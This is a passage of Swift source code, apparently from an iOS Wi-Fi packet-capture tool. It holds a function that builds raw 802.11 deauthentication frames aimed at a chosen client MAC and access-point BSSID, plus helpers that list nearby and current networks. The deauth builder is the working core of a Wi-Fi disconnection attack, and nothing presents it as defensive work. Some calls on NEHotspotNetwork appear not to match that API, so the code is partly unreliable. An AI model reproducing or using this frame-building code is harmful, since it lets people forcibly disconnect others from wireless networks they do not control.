    if frequency >= 5925 && frequency <= 7125 {
      return ((frequency - 5955) / 5) + 1
    }
    return nil
  }

  private func buildDeauthFrame(bssid: String, clientMac: String, sequence: UInt16) -> Data {
    let radiotapHeader: [UInt8] = [0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00]
    var frame = Data(radiotapHeader)

    var frameControl: UInt16 = 0x00c0
    frame.append(contentsOf: withUnsafeBytes(of: &frameControl.littleEndian) { Data($0) })

    var duration: UInt16 = 0
    frame.append(contentsOf: withUnsafeBytes(of: &duration.littleEndian) { Data($0) })

    frame.append(macBytes(from: clientMac))
    frame.append(macBytes(from: bssid))
    frame.append(macBytes(from: bssid))

    var sequenceControl = sequence << 4
    frame.append(contentsOf: withUnsafeBytes(of: &sequenceControl.littleEndian) { Data($0) })

    var reason: UInt16 = 0x0007
    frame.append(contentsOf: withUnsafeBytes(of: &reason.littleEndian) { Data($0) })

    return frame
  }

  private func macBytes(from address: String) -> Data {
    let parts = address.split(separator: ":")
    let bytes = parts.compactMap { UInt8($0, radix: 16) }
    return Data(bytes)
  }

  private func fetchCurrentNetworks(completion: @escaping ([[String: Any]]) -> Void) {
    var results = networksFromCaptive()

    guard #available(iOS 14.0, *) else {
      completion(results)
      return
    }

    NEHotspotNetwork.fetchCurrent { network in
      if let network = network {
        var entry: [String: Any] = [
          "bssid": network.bssid,
          "ssid": network.ssid,
          "signal": Int(round(network.signalStrength * 50.0)) - 100,
          "channel": network.channelNumber,
          "security": network.isSecure ? "Secured" : "Open",
          "frequency": PacketCaptureSession.frequency(for: network.channelNumber),
          "capabilities": network.isSecure ? "802.11 security enabled" : "802.11 open",
        ]

        if let autoJoin = network.didAutoJoin {
          entry["autoJoin"] = autoJoin
        }

        if let index = results.firstIndex(where: { ($0["bssid"] as? String) == network.bssid }) {
          results[index] = entry
        } else {
          results.append(entry)
        }
      }

      completion(results)
    }
  }

  private func networksFromCaptive() -> [[String: Any]] {
    guard let interfaces = CNCopySupportedInterfaces() as? [String] else {
      return []
    }

    return interfaces.compactMap { interfaceName -> [String: Any]? in
      guard
        let info = CNCopyCurrentNetworkInfo(interfaceName as CFString) as NSDictionary?,
        let ssid = info[kCNNetworkInfoKeySSID as String] as? String,
        let bssid = info[kCNNetworkInfoKeyBSSID as String] as? String
      else {
        return nil
      }

      return [
        "bssid": bssid,
        "ssid": ssid,
        "signal": -62,
        "channel": 0,
        "security": "Unknown",
        "frequency": 0,
        "capabilities": "802.11",
      ]
    }
  }
}
